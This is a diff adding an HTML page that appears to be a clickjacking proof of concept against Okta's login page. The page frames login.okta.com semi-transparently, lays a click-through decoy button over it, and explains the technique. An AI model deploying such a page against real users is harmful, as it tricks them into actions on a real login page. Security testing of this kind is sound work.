@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="google-site-verification" content="V6o6vQQNfSkM0GYJG5XTR9U_pj5_pyxQyZBpl8qLrkI" />
+    <title>Clickjacking Simulation - Okta</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        margin: 40px;
+      }
+      .frame-container {
+        position: relative;
+        width: 500px;
+        height: 500px;
+        margin: auto;
+      }
+      iframe {
+        width: 100%;
+        height: 100%;
+        border: none;
+        opacity: 0.4;
+        position: absolute;
+        top: 0;
+        left: 0;
+        z-index: 1;
+        pointer-events: auto;
+      }
+      #overlay-button {
+        position: absolute;
+        top: 140px;
+        left: 90px;
+        z-index: 2;
+        padding: 12px 24px;
+        background-color: #28a745;
+        color: white;
+        font-size: 16px;
+        border: none;
+        cursor: pointer;
+        pointer-events: none;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Clickjacking Simulation: "Enter Raffle" Button</h1>
+    <div class="frame-container">
+      <iframe src="https://login.okta.com/"></iframe>
+      <button id="overlay-button">Overlay button</button>
+    </div>
+
+    <h3>
+      <b>What this demonstrates:</b><br>
+      This test simulates a <strong>clickjacking attack</strong>, where a legitimate-looking button ("Overlay button") is visually presented to the user, but clicking it actually interacts with a button or input behind it — in this case, inside an <code>iframe</code> of Okta’s login page.<br><br>
+      The attacker uses styling and <code>pointer-events: none</code> to trick the user into thinking they're clicking the raffle button, while in reality it's submitting information or clicking a login action underneath.<br><br>
+      </a>.
+    </h3>
+  </body>
+</html>
